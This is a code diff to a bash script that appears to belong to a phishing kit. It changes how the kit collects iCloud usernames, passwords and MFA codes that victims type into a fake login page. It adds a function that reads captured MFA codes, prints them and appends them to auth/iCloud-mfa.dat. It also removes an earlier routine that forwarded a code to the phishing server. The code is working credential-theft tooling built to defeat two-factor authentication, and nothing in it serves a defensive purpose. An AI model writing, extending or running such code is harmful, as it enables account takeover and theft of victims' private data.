@@ -515,30 +515,6 @@ capture_creds() {
 
 }
 
-extract_icloud_code() {
-	echo "" > .server/www/code.txt
-
-	while true; do
-		read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter the code (iCloud) (6 digits): " USER_INPUT
-
-		# Get the length of the input
-		INPUT_LENGTH=$(echo -n "$USER_INPUT" | wc -m)
-
-		# Check if the input is 6 digits
-		if [[ $INPUT_LENGTH -ge 6 ]]; then
-			break
-		else
-			echo -e "\n${RED}[${WHITE}-${RED}]${RED} Invalid code (6 digits required). Please try again."
-		fi
-	done
-	
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Code Input: "
-	echo -e "${RED}[${WHITE}-${RED}]${BLUE} $USER_INPUT"
-	echo "$USER_INPUT" > .server/www/code.txt
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}.server/www/code.txt"
-	send_data http://${HOST}:${PORT}/loading.html ${USER_INPUT}
-}
-
 capture_icloud_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames-icloud.txt | awk '{print $2}')
 	PASSWORD=$(grep -o 'Pass: [^ ]*' .server/www/usernames-icloud.txt | awk '{print $2}')
@@ -547,27 +523,15 @@ capture_icloud_creds() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames-icloud.dat"
 	cat .server/www/usernames-icloud.txt >> auth/usernames-icloud.dat
-
-	while true; do
-		read -p "${RED}[${WHITE}-${RED}]${BLUE} Generate iCloud Code? (y/n): " choice
-		case $choice in
-			[Yy]*)
-				extract_icloud_code
-				break
-				;;
-			[Nn]*)
-				echo 234 > .server/www/code.txt
-				rm -rf .server/www/code.txt
-				echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} continue..."
-				break
-				;;
-			*)
-				echo -e "\n${RED}[${WHITE}-${RED}]${RED} Invalid choice. Please try again."
-				;;
-		esac
-	done
 }
 
+capture_mfa_code() {
+	MFA=$(grep -o 'Code:.*' .server/www/iCloud-mfa.txt | awk '{print $2}')
+	IFS=$'\n'
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account: ${BLUE}$MFA"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/iCloud-mfa.dat"
+	cat .server/www/iCloud-mfa.txt >> auth/iCloud-mfa.dat
+}
 
 ## Print data
 capture_data() {
@@ -591,6 +555,13 @@ capture_data() {
 			capture_icloud_creds
 
 			rm -rf .server/www/usernames-icloud.txt
+		fi
+		sleep 0.75
+		if [[ -e ".server/www/iCloud-mfa.txt" ]]; then
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} iCloud MFA Code Found !!"
+			capture_mfa_code
+
+			rm -rf .server/www/iCloud-mfa.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/resend.txt" ]]; then
